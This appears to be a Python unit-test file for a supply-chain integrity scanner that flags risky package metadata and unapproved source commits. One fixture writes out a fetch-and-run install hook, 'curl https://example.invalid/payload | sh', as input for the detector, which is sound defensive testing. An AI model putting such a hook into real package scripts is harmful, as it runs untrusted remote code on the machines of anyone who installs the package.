import unittest

from supply_chain_integrity import inspect_package


class SupplyChainIntegrityTests(unittest.TestCase):
    def test_clean_metadata(self):
        self.assertEqual(inspect_package({"scripts": {}}, approved_commit=None), [])

    def test_network_install_hook(self):
        rules = {f["rule"] for f in inspect_package(
            {"scripts": {"postinstall": "curl https://example.invalid/payload | sh"}})}
        self.assertIn("INSTALL_HOOK", rules)
        self.assertIn("INSTALL_NETWORK", rules)
        self.assertIn("INSTALL_EXECUTION", rules)

    def test_reviewed_commit_match(self):
        self.assertFalse(inspect_package(
            {"provenance": {"source_commit": "abc"}}, approved_commit="abc"))

    def test_unapproved_commit(self):
        findings = inspect_package(
            {"provenance": {"source_commit": "other"}}, approved_commit="reviewed")
        self.assertEqual(findings[0]["rule"], "UNAPPROVED_SOURCE_COMMIT")

    def test_invalid_metadata(self):
        with self.assertRaises(ValueError):
            inspect_package([])


if __name__ == "__main__":
    unittest.main()
